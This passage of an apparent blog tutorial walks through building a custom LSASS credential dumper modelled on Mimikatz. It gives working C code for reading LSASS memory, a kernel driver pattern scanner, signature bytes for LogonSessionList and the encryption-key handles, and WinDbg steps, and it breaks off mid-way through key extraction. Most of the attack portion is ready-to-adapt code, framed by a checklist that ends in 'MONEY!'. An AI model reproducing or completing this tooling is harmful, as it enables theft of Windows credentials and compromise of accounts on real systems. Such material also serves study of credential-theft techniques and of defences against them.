	NTSTATUS status = pNtQueryInformationProcess(hTarget, ProcessBasicInformation, &pProcBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &ulRetLength);

	if (!NT_SUCCESS(status)) {
		return false;
	}
	printf("pointing pPEB\n");

	*pPEB = pProcBasicInfo.PebBaseAddress;  // remote PEB address>????
	printf("pPEB pointed???????\n");
	return true;
}
```

Similar to when we found lsass we're pulling a function out of ntdll, `NtQueryInformationProcess`.

```c
NTSTATUS NtQueryInformationProcess(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);
```


When we specify `ProcessInformationClass` we're telling the function to retrieve basic information about the target process. This information is stored within the `PROCESS_BASIC_INFORMATION`

```c
typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PPEB PebBaseAddress;
    ULONG_PTR AffinityMask;
    KPRIORITY BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;
```

Which contains a pointer to the PEB structure!

## Module Comparison

Now that we have the PEB address we can begin enumerating the modules loaded by the processes to find lsasrv.dll


First we start by specifying our `PEB_LDR_DATA` structure which contains our head `LIST_ENTRY` for the loaded modules.
```c
bool findLsasrv(HANDLE hTarget, PEB peb, PVOID* pTargetModuleBase, ULONG* pSize) {
	*pTargetModuleBase = NULL;
	printf("In NTLM\n");

	wprintf(L"SEARCHING FOR: %s\n", wTargetDLL);

	// 3) Read remote PEB_LDR_DATA
	PEB_LDR_DATA ldr = { 0 };
	printf("In NTLM\n");
	if (!ReadProcessMemory(hTarget, peb.Ldr, &ldr, sizeof(ldr), NULL)) {
		printf("LDR\n");
		return FALSE;
	}
	printf("retrieved remote head entry addr\n");
```

Within the `PEB_LDR_DATA` structure we can loop through `InLoadOrderModuleList` or the `InMemoryOrderModuleList` list to see all the modules.  They in theory should contain the same module pointers, just arranged based on when they were loaded into the process or based on how they're arranged in memory, but wholistically contain the same information.


```c 
	// 4) Compute remote address of list head (InMemoryOrderModuleList)
	//    and read the head LIST_ENTRY
	const BYTE* remoteLdrBase = (const BYTE*)peb.Ldr;
	const BYTE* remoteHeadAddr = remoteLdrBase + offsetof(PEB_LDR_DATA, InMemoryOrderModuleList);
```

Now with a pointer to the head list entry address inside of LSASS we can read that to extract the `LIST_ENTRY` structure.

```c
	LIST_ENTRY headLE = { 0 };
	if (!ReadProcessMemory(hTarget, remoteHeadAddr, &headLE, sizeof(headLE), NULL)) {
		printf("headLE\n");
		return false;
	}
	printf("retrieved remote head entry addr\n");
```


From here we keep this the same as our comparison to make sure we dont constantly loop through the modules, and can start Flinking through the loaded DLLs.
```c
	// 5) Iterate: remoteCurrent points to a remote LIST_ENTRY
	const LIST_ENTRY* remoteCurrentAddr = headLE.Flink;
	printf("Out of while loops\n");
	while (remoteCurrentAddr != (const LIST_ENTRY*)remoteHeadAddr) {
		// Read the current remote LIST_ENTRY
		LIST_ENTRY curLE = { 0 };
		if (!ReadProcessMemory(hTarget, remoteCurrentAddr, &curLE, sizeof(curLE), NULL))
			break;
		// Compute the remote address of the containing LDR_DATA_TABLE_ENTRY:
		//   entryAddr = remoteCurrentAddr - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks)
		const BYTE* remoteEntryAddr =
			(const BYTE*)remoteCurrentAddr - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

		// Read only the fields we need from the entry to keep it robust
		struct {
			LIST_ENTRY InLoadOrderLinks;
			LIST_ENTRY InMemoryOrderLinks;
			LIST_ENTRY InInitializationOrderLinks;
			PVOID      DllBase;
			PVOID      EntryPoint;
			ULONG      SizeOfImage;
			UNICODE_STRING FullDllName;
			UNICODE_STRING BaseDllName;
		} entry;

		if (!ReadProcessMemory(hTarget, remoteEntryAddr, &entry, sizeof(entry), NULL))
			break;

		// Read the UNICODE_STRING buffer (full path)
		wchar_t fullPath[MAX_PATH * 4]; // large enough for winSxS paths
		if (!ReadUnicodeStringRemote(hTarget, &entry.FullDllName, fullPath, _countof(fullPath)))
			fullPath[0] = L'\0';

		// Debug print
		wprintf(L"Reading %s\n", fullPath);

		// Compare
		if (_wcsicmp(fullPath, wTargetDLL) == 0) {
			*pTargetModuleBase = entry.DllBase;
			*pSize = entry.SizeOfImage;
			printf("MODULE FOUND!!!\n");
			return TRUE;
		}
		// Advance: move to next wnode using the pointer we just read into curLE
		remoteCurrentAddr = curLE.Flink;
	}

	return FALSE;
}
```

Within each LIST_ENTRY we're pulling the `LDR_DATA_TABLE_ENTRY` which contains an element for the FullDllName that we use to confirm when we've found L"C:\\Windows\\system32\\lsasrv.dll"`.

# Extracting Credentials

Now that we've found lsasrv.dll comes the fun part, extracting credentials! Lets take another look at our checklist:

1. Create driver ✔️
2. Load driver ✔️
3. Unprotect lsass ✔️
4. Get lsass process handle ✔️
5. Find lsasrv.dll in lsass memory space ✔️
6. Find `LogonSessionList` pattern match address in lsasrv.dll
7. Find AES/DES/IV Key pattern match address in lsasrv.dll.
8. 9. Extract AES / DES / IV Keys
9. Read through LogonSessionList for encrypted security blobs
10. Decrypt encrypted security blob
11. MONEY!

## LogonSessionList

The LogonSessionList is a structure unique to lsass that stores the credentials we're after.  This is where some review of the Mimikatz source code starts to come in handy.  The LogonSessionList is represented in Mimikatz as the `PKIWI_MSV1_0_LIST_63` structure:

```c
typedef struct _LSA_UNICODE_STRING {
    USHORT Length;          // in bytes, not characters
    USHORT MaximumLength;   // in bytes
    PWSTR  Buffer;          // pointer to wide string
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING;

typedef struct _KIWI_MSV1_0_LIST_63 {
    struct _KIWI_MSV1_0_LIST_63* Flink;
    struct _KIWI_MSV1_0_LIST_63* Blink;
    PVOID unk0;
    ULONG unk1;
    PVOID unk2;
    ULONG unk3;
    ULONG unk4;
    ULONG unk5;
    HANDLE hSemaphore6;
    PVOID unk7;
    HANDLE hSemaphore8;
    PVOID unk9;
    PVOID unk10;
    ULONG unk11;
    ULONG unk12;
    PVOID unk13;
    LUID LocallyUniqueIdentifier;
    LUID SecondaryLocallyUniqueIdentifier;
    UCHAR waza[12];
    LSA_UNICODE_STRING UserName;
    LSA_UNICODE_STRING Domaine;
    PVOID unk14;
    PVOID unk15;
    LSA_UNICODE_STRING Type;
    PSID pSid;
    ULONG LogonType;
    PVOID unk18;
    ULONG Session;
    LARGE_INTEGER LogonTime;
    LSA_UNICODE_STRING LogonServer;
    KIWI_MSV1_0_CREDENTIALS* Credentials;
    PVOID unk19;
    PVOID unk20;
    PVOID unk21;
    ULONG unk22;
    ULONG unk23;
    ULONG unk24;
    ULONG unk25;
    ULONG unk26;
    PVOID unk27;
    PVOID unk28;
    PVOID unk29;
    PVOID CredentialManager;
} KIWI_MSV1_0_LIST_63, * PKIWI_MSV1_0_LIST_63;
```

Here you can see a lot of unique and useful fields like `Username`'s, `Domain`'s, but what we're really after the `Credentials`.  We'll talk more about this list later, but for now we're just going to focus on finding it.

## Finding the LogonSessionList

Once again taking inspiration from Mimikatz is something I encourage!

You may want to save this link: [mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c at master · gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c)


![patterkKeys](attachments/Pasted%20image%20020250902212303.png)

Here we see mimikatz defining a pattern to search within the lsasrv memory space, with slight variations in the matter depending on which build of Windows the victim machine is running.  Once mimikatz has the address of where this pattern matches, its possible to retrieve the `LogonSessionList`pointer.

We can perform this sequence in Windgb first to get a better understanding of what we're actually doing.

First we need to attach to the lsass prospect, and find where lsasrv.dll's base address is:

```bash
!process 0 0 lsass.exe  # dump EPROCESS info briefly for lsass.exe>
```

![windbgAgain](attachments/Pasted%20image%2020250902212823.png)

Now we use the EPROCESS pointer and supply it to the `.process` command which changes the context of Windgb to that of the process.  Essentially it tells the debugger to pretend as if it's inside of your target process, thus allowing you to better interact with the memory addresses for that process.

```bash
.process /i /r /p ffffa886a73e7080 # Change context to process @ EPROCESS addr 
g
```

![irp](attachments/Pasted%20image%2020250902213151.png)

After changing the context of your debugger, in my experience you do need to reload your symbols.

```
.reload /user
```
![reload](attachments/Pasted%20image%2020250902213502.png)

Now we should be able to search for the lsasrv module with the `lm` command which [lists modules](https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/lm--list-loaded-modules-)that are loaded in memory by a process.  We specify a specific module with the `m` flag.

```
lm m lsasrv
```
![lm](attachments/Pasted%20image%2020250902213640.png)

Here we see the memory address range for the module!  Now we know exactly where our search will begin and where it will stop.


```c
BYTE PTRN_WIN5_LogonSessionList[]	= {0x4c, 0x8b, 0xdf, 0x49, 0xc1, 0xe3, 0x04, 0x48, 0x8b, 0xcb, 0x4c, 0x03, 0xd8};
BYTE PTRN_WN60_LogonSessionList[]	= {0x33, 0xff, 0x45, 0x85, 0xc0, 0x41, 0x89, 0x75, 0x00, 0x4c, 0x8b, 0xe3, 0x0f, 0x84};
BYTE PTRN_WN61_LogonSessionList[]	= {0x33, 0xf6, 0x45, 0x89, 0x2f, 0x4c, 0x8b, 0xf3, 0x85, 0xff, 0x0f, 0x84};
BYTE PTRN_WN63_LogonSessionList[]	= {0x8b, 0xde, 0x48, 0x8d, 0x0c, 0x5b, 0x48, 0xc1, 0xe1, 0x05, 0x48, 0x8d, 0x05};
BYTE PTRN_WN6x_LogonSessionList[]	= {0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74};
BYTE PTRN_WN1703_LogonSessionList[]	= {0x33, 0xff, 0x45, 0x89, 0x37, 0x48, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74};
BYTE PTRN_WN1803_LogonSessionList[] = {0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74};
BYTE PTRN_WN11_LogonSessionList[]	= {0x45, 0x89, 0x34, 0x24, 0x4c, 0x8b, 0xff, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74};
BYTE PTRN_WN11_22H2_LogonSessionList[]	= {0x45, 0x89, 0x37, 0x4c, 0x8b, 0xf7, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x0f, 0x84};

--

4c 8b df 49 c1 e3 04 48 8b cb 4c 03 d8
33 ff 45 85 c0 41 89 75 00 4c 8b e3 0f 84
33 f6 45 89 2f 4c 8b f3 85 ff 0f 84 
8b de 48 8d 0c 5b 48 c1 e1 05 48 8d 05
33 ff 41 89 37 4c 8b f3 45 85 c0 74 <- first one w a hit on my machine!
33 ff 45 89 37 48 8b f3 45 85 c9 74
33 ff 41 89 37 4c 8b f3 45 85 c9 74 
45 89 34 24 4c 8b ff 8b f3 45 85 c0 74
45 89 37 4c 8b f7 8b f3 45 85 c0 0f 84
```

To search for any of the byte sequences above we use the `s` [command](https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/s--search-memory-)which searches for a byte sequence in memory.

```
s -b 00007ffd`bd8d0000 00007ffd`bda7e000 33 ff 41 89 37 4c 8b f3 45 85 c0 74
```
![search](attachments/Pasted%20image%2020250902214041.png)

And we get a hit!  Lets [unassemble](https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/u--unassemble-) this bit of memory and see what kind of instructions are taking place there.  This provides an assembly translation at an address of our choosing.

```
u 00007ffd`bd93e384
```

![u](attachments/Pasted%20image%2020250902214235.png)

Perfect! We actually SEE the reference to LogonSessionList. Here the assembler is telling the computer to place the address of LogonSessionList inside of the rcx register.

We are `lea`'ing the LogonSessionList address into RCX.  We're loading the effective address of LogonSessionList into rcx, so it MUST be passing the pointer to the struct we need, which obviously it is and we can see that in the image above.

Its also just a rule that `rcx` is equal to the address of the next instruction + the displacement from the address of the next instruction TO the LogonSessionList

```c
00007ffd`bd93e384 = pattern match
Each instruction sequence is 7 bytes.
We have an offset of 20 to get to the lea instruction.
...
...
00007ffd`bd93e398 488d0d<915b1200> lea  rcx,[lsasrv!LogonSessionList (00007ffd`bda63f30)]    +0x20
Then our next address is 00007ffd`bd93e398 + 0x07 = 
00007ffd`bd93e39f + offset of <00125b91> (Little endian of 915b1200) = LogonSessoinList
```


![address](attachments/Pasted%20image%2020250902220710.png)

Hopefully that makes sense because now we need to implement this process in C!

## Pattern Searching

### Userland Code

As a POC for reading memory in userspace from the kernel, I ended up doing this process through the driver and IOCTL calls.

```c
struct Patterns {
	PVOID pLogonSessionListPattern;
	PVOID pKeysPattern;
};
...
driver::Patterns bytePatterns = { 0 };
bytePatterns = driver::findLogonSessionList(hDriver, pLsasrv, pEnd);
```

We create a structure to hold two patterns since I both of my pattern searches at the same time, we'll come back to the keys pattern later, but then I end up calling the `findLogonSessionList` function.

This part is actually fairly straight forward:

```c
	Patterns findLogonSessionList(HANDLE hDriver, PVOID pBase, PVOID pEnd) {
		Request req;
		req.pBase = pBase;
		req.pEnd = pEnd;

		printf("Base: 0x%p\n", req.pBase);
		printf("End : 0x%p\n", req.pEnd);

		req.Patterns = { 0 };
		DeviceIoControl(hDriver, codes::lssl, &req, sizeof(req), &req, sizeof(req), nullptr, nullptr);
		if (req.Patterns.pKeysPattern == NULL || req.Patterns.pLogonSessionListPattern == NULL) {
			printf("DeviceIoControl error getting pLssl,,.,.\n");
		}
		printf("Pattern LogonSessionList @ 0x%p\nPattern Keys @ 0x%p\n", req.Patterns.pLogonSessionListPattern, req.Patterns.pKeysPattern);
		return req.Patterns;
	}
```

We're retruning that `Patterns` struct displayed just above,  The base and and end address come from our module enumeration earlier, and the patterns we're searching for are stored in the driver.

On this side of the kernel, all we do is send an IOCTL to our driver and wait for pointers back.

### Kernel Code

We send the IOCTL to our driver, now we need to search for the pattern.  Like mentioned above I'm storing the patterns in the driver:

```c
struct Patterns {
	PVOID LogonSessionListPattern;
	PVOID KeysPattern;
};
```


First we define a function that accepts an upper and a lower bound for memory to search for the patterns.

```c
Patterns patternScanner(PVOID pBase, PVOID pEnd) {
	Patterns ReturnPatternPointers = { 0 };
	typedef struct {
		UCHAR* bytes;
		size_t length;
	} BytePattern;
	UCHAR LslPattern[12] = { 0x33,0xFF,0x41,0x89,0x37,0x4C,0x8B,0xF3,0x45,0x85,0xC0,0x74 };
	UCHAR keyPattern[16] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
	BytePattern BytePatterns[] = {
		{LslPattern,sizeof(LslPattern)},
		{keyPattern,sizeof(keyPattern)}
	};
```


Then with our patterns defined and held inside of the struct, we need to start looking through memory.

First we setup a for loop to search through the number of patterns that we have:

```c
for (int i = 0;i<sizeof(BytePatterns)/sizeof(BytePatterns[0]);i++){
```

The next for loop is what searches through actual memory.  We need to setup a holder for the current pattern within the `Patterns` struct that we're looking for

```c
	size_t patternLength = BytePatterns[i].length;
	PUCHAR pattern = BytePatterns[i].bytes;
```

THen with the pattern and the pattern length, we start looping through memory.  Here is what for loop looks like:

```c
	for (UCHAR* chunkStart = start; chunkStart + patternLength <= end; chunkStart += (CHUNK_SIZE - (patternLength - 1))) {
		size_t remaining = end - chunkStart;
	
		size_t scanSize;
	
		if (remaining < CHUNK_SIZE)
			scanSize = remaining;
		else
			scanSize = CHUNK_SIZE;
	
	
		if (scanSize < patternLength) break; // nothing left to scan
```

We start at our starting base address that was passed into the function.  That value is then stored in `chunkStart`.  Then we start by adding the `patternLength` and check to make sure that we're within our upper memory address limit `end` which is passed to the function. Then increment our `chunkStart` variable by `CHUNK_SIZE - (patternLength - 1))` which  brings us within 1 patternLength of the end of the chunk.

Then we create the `remaining` which is the remaining number of bytes of memory to search.  If the bytes remaining is less then our `CHUNK_SIZE` then that just becomes the `CHUNK_SIZE`, otherwise we're just going to search a standard chunk.  If the scanSize is less then the patternLength then we know that it cant contain the pattern.

`scanSize` is the number of bytes that we have left to search in this chunk.

Then we enter a try exception sequence that searches through the chunk incrementing by one byte each time, but using the `compareN` function to search the next `patternLength` amount of bytes and see if they're equal to the pattern bytes. 

```c
	__try {
		for (size_t j = 0; j <= scanSize - patternLength; j++) {
			if (compareN(chunkStart + j,pattern, patternLength)) {
				debug_printer("FOUND IT! Setting offset....\n");

				ULONG_PTR address = (ULONG_PTR)(chunkStart + j);
				ULONG offset = (ULONG)(((UCHAR*)chunkStart + j) - (UCHAR*)pBase);
				DbgPrint("Win1803 Location: 0x%p\n", (PVOID)address);
				DbgPrint("Offset Location: 0x%llu\n", (unsigned long long)offset);

				if (i == 0) {
					ReturnPatternPointers.LogonSessionListPattern = (PVOID)address;
				}
				else if (i == 1) {
					ReturnPatternPointers.KeysPattern = (PVOID)address;
					return ReturnPatternPointers;
				}
			}
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		// Skip this chunk safely
		debug_printer("Exception handler for pattern search...\n");
	}
KeShouldYieldProcessor(); // Yield CPU to avoid watchdog timeout
}
```

If it is equal then based on which pattern we're looking for it saves the address in the returned `Pattern` structure.

```c
// Compare 12 bytes at base with pattern
bool compareN(UCHAR* base, UCHAR* pattern, size_t length) {
	for (int i = 0; i < length; i++) {
		if (base[i] != pattern[i])
			return false;
	}
	return true;
}
```

My biggest issue writing this fucntion was watchdog issues that were resulting in bluescreens.  Some key takeaways for me:
1. `KeShouldYieldProcessor()`- This function ends up telling the processor that this function can yield for other important processor functions.  This alone wont fix issues though
2. `CHUNK_SIZE` - This breaks up the searching into more managable chunks, allowing the processor time in between to take care of actions and avoid any watchdog issues.


Now we have the memory address of our patterns for LogonSessionList and the keys base!


## FInd LogonSessionList

Now with our pattern we can find the actual LogonSessionList structure. We discussed this in Windbg above so now its time to implement that in C code.

```c
Patterns bytePatterns
bytePatterns = driver::findLogonSessionList(hDriver, pLsasrv, pEnd);
```

We can access the LogonSessionList pattern through `bytePatterns.pLogonSessionListPattern`.

```c
pLsl = bytePatterns.pLogonSessionListPattern;
pKeysBase = bytePatterns.pKeysPattern;
```

Then from here we apply a `0x14` offset from the pattern match address that brings us back up to the `lea` instruction:

![lea](attachments/Pasted%20image%2020250902214235.png)
![lea2](attachments/Pasted%20image%2020250903191427.png)

```c

PVOID pLslActual = (PVOID)((BYTE*)pLsl + 0x14); //offset to 00007ffd`fc17e398 488d0d915b1200  lea     rcx,[lsasrv!LogonSessionList (00007ffd`fc2a3f30)] lea instruction to retr address
```
You can see the instruction in memory with each of the assembly instructions underlined in a different color, followed by the offset that we're looking for thaat will yield the LogonSessionList highlighted in yellow:
![instruction](attachments/Pasted%20image%2020250903191652.png)

```
488d0d = Assembly bytes
915b1200 = Offset
```

So with that we search for the assembly bytes and once we have them extract the offset/`disp32`:

```c
if (!ReadProcessMemory(hTarget, pLslActual, leaBytes, sizeof(leaBytes), &bytesRead) || bytesRead != sizeof(leaBytes)) {
	printf("Failed to read remote memory. Error: %lu\n", GetLastError());
	CloseHandle(hTarget);
	return 1;
}
if (bytesRead == sizeof(leaBytes) && leaBytes[0] == 0x48 && leaBytes[1] == 0x8D && leaBytes[2] == 0x0D) {
	// extract displacement
	int32_t disp32 = *(int32_t*)&leaBytes[3];

```

but remember that the offset is applied from the NEXT instruction so we have to add 7 bytes:

```c
	// next instruction is leaAddr + 7
	UINT64 nextInstr = (UINT64)pLslActual + 7;
```

And that then allows us to find the `LogonSessionList` address which we store inside of `target`. then shift to `pLogonSessoin`
```c
	target = nextInstr + disp32;

	printf("RIP-relative target = 0x%llx\n", target); //i need to learn how this shit works like actually cos this is so confusing.
}

printf("Offset of Credentials = 0x%zx\n",offsetof(KIWI_MSV1_0_LIST_63, Credentials)); //offset A0?

PVOID pLogonSessionList = (PVOID)(uintptr_t)target;
```

## Credentials Extraction


Now with the `LogonSessionList` we get into the meat of Mimikatz, and this project.  Finding out where the credentials are stored, and parsing them out.  Lets go back to the `PKIWI_MSV1_0_LIST_63`.

```c
typedef struct _KIWI_MSV1_0_LIST_63 {
    struct _KIWI_MSV1_0_LIST_63* Flink;
    struct _KIWI_MSV1_0_LIST_63* Blink;
    PVOID unk0;
    ULONG unk1;
    PVOID unk2;
    ULONG unk3;
    ULONG unk4;
    ULONG unk5;
    HANDLE hSemaphore6;
    PVOID unk7;
    HANDLE hSemaphore8;
    PVOID unk9;
    PVOID unk10;
    ULONG unk11;
    ULONG unk12;
    PVOID unk13;
    LUID LocallyUniqueIdentifier;
    LUID SecondaryLocallyUniqueIdentifier;
    UCHAR waza[12];
    LSA_UNICODE_STRING UserName;
    LSA_UNICODE_STRING Domaine;
    PVOID unk14;
    PVOID unk15;
    LSA_UNICODE_STRING Type;
    PSID pSid;
    ULONG LogonType;
    PVOID unk18;
    ULONG Session;
    LARGE_INTEGER LogonTime;
    LSA_UNICODE_STRING LogonServer;
    KIWI_MSV1_0_CREDENTIALS* Credentials;
    PVOID unk19;
    PVOID unk20;
    PVOID unk21;
    ULONG unk22;
    ULONG unk23;
    ULONG unk24;
    ULONG unk25;
    ULONG unk26;
    PVOID unk27;
    PVOID unk28;
    PVOID unk29;
    PVOID CredentialManager;
} KIWI_MSV1_0_LIST_63, * PKIWI_MSV1_0_LIST_63;
```

The treasure trove is located within `KIWI_MSV1_0_CREDENTIALS* Credentials`.  But lets not forget that we dont actually have this entire struct in our local process's memory right now, we simply have a pointer to it in lsass's memory.

So the first thing we need to do is get this struct inside of our processes memory so we can view its elements:

```c

void userlandExtraction(HANDLE hTarget, PVOID pLogonSessionList) {
	// Step 1: read the head pointer (points into LSASS memory)
	PKIWI_MSV1_0_LIST_63 headPtr = NULL;
	if (!ReadProcessMemory(hTarget, pLogonSessionList, &headPtr, sizeof(headPtr), NULL) || !headPtr) {
		printf("[-] Failed to read head pointer\n");
		return;
	}
```

From here we now have the pointer to the LogonSessionList stored inside of `headPtr`.  We dont have the actual structure yet so we need to read the memory at that pointer's address to get access to the struct:

```c
	// Step 2: read the head node structure
	KIWI_MSV1_0_LIST_63 head = { 0 };
	if (!ReadProcessMemory(hTarget, headPtr, &head, sizeof(head), NULL)) {
		printf("[-] Failed to read head struct\n");
		return;
	}
```


Now with the list we can start iterating through it very similarly to the rest of the `LIST_ENTRY` structures we were looking at earlier.  We'll setup another pointer to another list structure and set that equal to the next entry in the list with `head.Flink` and then we can start looping through all of the list entries:

```c
	// Step 3: iterate the linked list
	PKIWI_MSV1_0_LIST_63 current = head.Flink;
	while (current && current != headPtr) {
		KIWI_MSV1_0_LIST_63 node = { 0 };
		if (!ReadProcessMemory(hTarget, current, &node, sizeof(node), NULL)) {
			printf("[-] Failed to read node @ %p\n", current);
			break;
		}
		printf("KIWI STRUCT 0x%p\n", node);
		printf("Username Buffer 0x%p", node.UserName.Buffer);

```

Inside the while loop once we ensure that our current place in the list is not pointing back to the start, we can read the contents of that list entry and store it in `node`.

THIS is what grants us access to the struct we talked about earlier.  From here we can parse out usernames, domains, times, ect.  

One thing to keep in mind, is that the username is not actually stored within this structure however, only a pointer to the buffer containing the usernames and domains.  So we read the pointer for the current list entries' username and then store that inside of a buffer that we can print:

```c
printf("KIWI STRUCT 0x%p\n", node);
printf("Username Buffer 0x%p", node.UserName.Buffer);

// Step 4: read the username if present
if (node.UserName.Buffer && node.UserName.Length > 0) {
	wchar_t buffer[256] = { 0 };
	SIZE_T bytesToRead = min(node.UserName.Length, sizeof(buffer) - sizeof(wchar_t));

	if (ReadProcessMemory(hTarget, node.UserName.Buffer, buffer, bytesToRead, NULL)) {
		// Length is in bytes, so divide by sizeof(WCHAR)
		wprintf(L"[+] Username: %.*s\n", node.UserName.Length / sizeof(WCHAR), buffer);
	}
	else {
		printf("[-] Failed to read username buffer @ %p\n", node.UserName.Buffer);
	}

}
else {
	printf("[*] NO USERNAME\n");
}
```

Finally we just need to advance the list with 

```c
	// Step 5: advance
	current = node.Flink;
```

This provides an example of just printing out the usernames.  Thats not what we're after though. What we need is the security blob.

## Security Blob

The security blob is contained within the `KIWI_MSV1_0_CREDENTIALS` structure:

```c
typedef struct _KIWI_MSV1_0_CREDENTIALS {
	struct _KIWI_MSV1_0_CREDENTIALS *next;
	DWORD AuthenticationPackageId;
	PKIWI_MSV1_0_PRIMARY_CREDENTIALS PrimaryCredentials;
} KIWI_MSV1_0_CREDENTIALS, *PKIWI_MSV1_0_CREDENTIALS;
```

User hashes are stored within the `PrimaryCredentials` variable which is contained within the `PKIWI_MSV1_0_PRIMARY_CREDENTIALS` structure.


```c
typedef struct _KIWI_MSV1_0_PRIMARY_CREDENTIALS {
	struct _KIWI_MSV1_0_PRIMARY_CREDENTIALS *next;
	ANSI_STRING Primary;
	LSA_UNICODE_STRING Credentials;
} KIWI_MSV1_0_PRIMARY_CREDENTIALS, *PKIWI_MSV1_0_PRIMARY_CREDENTIALS;
```

The encrypted hashes are finally contained within the `LSA_UNICODE_STRING`.

```c
typedef struct _LSA_UNICODE_STRING {
	USHORT Length; // Length of the string in bytes (excluding null terminator)
	USHORT MaximumLength; // Total allocated size in bytes for the buffer
	PWSTR Buffer; // Pointer to the wide-character string
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING;
```

So to recount our steps so far:
1. Create driver ✔️
2. Load driver ✔️
3. Unprotect lsass ✔️
4. Get lsass process handle ✔️
5. Find lsasrv.dll in lsass memory space ✔️
6. Find `LogonSessionList` pattern match address in lsasrv.dll✔️
7. Find AES/DES/IV Key pattern match address in lsasrv.dll 
8. 9. Extract AES / DES / IV Keys
9. Read through LogonSessionList for encrypted security blobs
10. Decrypt encrypted security blob
11. MONEY!

## Finding Encryption Keys

Mimikatz has two types of encryption for their security blobs, AES and DES. Adam Chester's [article](https://blog.xpnsec.com/exploring-mimikatz-part-1/) and [code](https://gist.github.com/xpn/12a6907a2fce97296428221b3bd3b394) explains the reverse engineering process he used to make this discovery extremely well.  In order to decrypt the security blob we need to find the AES, DES, and IV keys.  In order to find these keys we need to find the `KIWI_HARD_KEY` for both AES and DES.

```c
typedef struct _KIWI_HARD_KEY {
    ULONG cbSecret;
    BYTE data[60]; // etc...
} KIWI_HARD_KEY, * PKIWI_HARD_KEY;
```

How do we we find the `HARD_KEY`? This structure is nested within both the `KIWI_BCRYPT_HANDLE_KEY` and `KIWI_BCRYPT_KEY81`.  

```c
typedef struct _KIWI_BCRYPT_HANDLE_KEY {
    ULONG size;
    ULONG tag;	// 'UUUR'
    PVOID hAlgorithm;
    PKIWI_BCRYPT_KEY81 key;
    PVOID unk0;
} KIWI_BCRYPT_HANDLE_KEY, * PKIWI_BCRYPT_HANDLE_KEY;

typedef struct _KIWI_BCRYPT_KEY81 {
    ULONG size;
    ULONG tag;	// 'MSSK'
    ULONG type;
    ULONG unk0;
    ULONG unk1;
    ULONG unk2;
    ULONG unk3;
    ULONG unk4;
    PVOID unk5;	// before, align in x64
    ULONG unk6;
    ULONG unk7;
    ULONG unk8;
    ULONG unk9;
    KIWI_HARD_KEY hardkey; <===TARGET!!
} KIWI_BCRYPT_KEY81, * PKIWI_BCRYPT_KEY81;
```

So the question then becomes, how do we find the `PKIWI_BCRYPT_KEY81`?  That is where the pattern search we performed earlier when we found the LogonSessionList pointer comes into play.

Using Adam Chester's article we can load lsasrv.dll into Ghidra and search its memory for the pattern

```c
UCHAR keyPattern[16] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
--
83 64 24 30 00 48 8d 45 e0 44 8b 4d d8 48 8d 15
```

```
Memory Search Hotkey = s 
```
![search](attachments/Pasted%20image%2020250830220502.png)

Adam Chester was able to discover that `DAT_180195420` is relative offset to an AES handle. For clarity we can rename this to `hAESKeyHandle`.

Then we can look at references to this object.  We clearly see it being used in BCrypt encryption routines

```
R Click > References > Show References to hAESKeyHandle
or 
Cntrl + Shift + F 
```
![ref](attachments/Pasted%20image%2020250903211131.png)

This shows us other times that the code calls or uses this object.  The first finding is of particular note as it clearly depicts BCrypt encryption routines

![find](attachments/Pasted%20image%2020250903211311.png)

![more](attachments/Pasted%20image%2020250830220844.png)

Examining the inputs going into the Bcrypt function on the right lets us fill out a couple more labels until we eventually find the DES key handle offset, and algorithm handles as well.

![handle](attachments/Pasted%20image%2020250903211737.png)

The blue box represents the address in memory that our pattern searching function is going to return.  We need to write code that takes us from the blue box, up to the red boxes.  Thankfully Mimikatz has helped out with this process as well!

The pattern search address simply provides a reliable place within close range of both our handles, that we can then apply another offset to.

[Mimkatz File](https://github.com/gentilkiwi/mimikatz/blob/152b208916c27d7d1fc32d10e64879721c4d06af/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c#L9)
![mim](attachments/Pasted%20image%2020250903212639.png)
These are build specific, just like the pattern bytes.  One hugely important misunderstanding I had when working through this is that **the offset listed above, takes you to a relative offset to the key.  This does NOT take you to the key itself!**

Now all that's left is to retrieve these handles:

First we can make some definitions for the AES,DES, and IV offsets, and similar to the relative offsets we found for the LogonSessionList, more int32_t since relative offsets are stored in 32 bit pointers.
```c
#define IVOffset 67 //67
#define AESKeyOffset 16//+16
#define DESKeyOffset 89 //-89

	int32_t hAesKeyOffset = 0; //what took me forever to realize is that this offset in mimikatz is not the KEY, its a relative offset to the KEY.
	int32_t hDesKeyOffset = 0;
	int32_t IVRelativeOffset = 0;
```

Now we need to read all the relative offsets to the key and store them in a place where we can pull the keys down later:

```c
size_t written = 0;
//retr offset from pattern to pointer to key handle
if(!ReadProcessMemory(hTarget, ((BYTE*)pKeyBase + AESKeyOffset), &hAesKeyOffset, sizeof(int32_t), &written)) {
